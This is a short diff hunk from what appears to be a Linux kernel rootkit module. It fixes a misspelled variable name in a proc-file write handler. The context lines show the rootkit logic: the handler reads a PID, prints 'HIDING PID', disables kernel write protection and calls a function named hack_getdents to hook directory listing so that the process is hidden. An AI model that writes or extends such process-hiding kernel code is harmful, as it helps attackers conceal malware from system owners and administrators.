@@ -309,7 +309,7 @@ int procfile_write(struct file *file, const char *buf, unsigned long count, void
   {
     proc_pid = str_to_lng(buff2);
     printk("HIDING PID %lld\n", proc_pid);
-    if(!proc_hdden){
+    if(!proc_hidden){
       disable_write_protection();
       hack_getdents();
       enable_write_protection();
